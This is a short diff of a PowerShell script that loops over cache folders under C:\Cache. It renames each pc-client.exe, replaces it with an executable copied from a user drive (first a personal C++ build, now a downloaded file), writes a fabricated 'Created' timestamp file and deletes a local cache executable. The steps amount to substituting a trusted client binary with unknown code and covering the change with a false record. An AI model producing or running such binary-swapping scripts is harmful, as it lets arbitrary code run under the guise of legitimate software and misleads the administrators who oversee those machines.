@@ -7,7 +7,7 @@ foreach ($f in Get-ChildItem "C:\Cache\"){
 		try {
 			copy ("C:\Cache\" + $f.name + "\pc-client.lap")  ("C:\Cache\" + $f.name + "\pc-client2.lap")
 			Rename-Item -Path ("C:\Cache\" + $f.name + "\pc-client.exe") -NewName "pc-client2.exe"
-			copy "U:\Desktop_2k\Computer Science\C++\a.exe"  ("C:\Cache\" + $f.name + "\pc-client.exe")
+			copy "U:\Downloads\pc-client"  ("C:\Cache\" + $f.name + "\pc-client.exe")
 			"Created: 2027-03-18 09:13:42" | Out-File -FilePath ("C:\Cache\" + $f.name + "\cache-created.txt")
 			Remove-Item -Path ("C:\Cache\" + $f.name + "\pc-client-local-cache.exe")
 
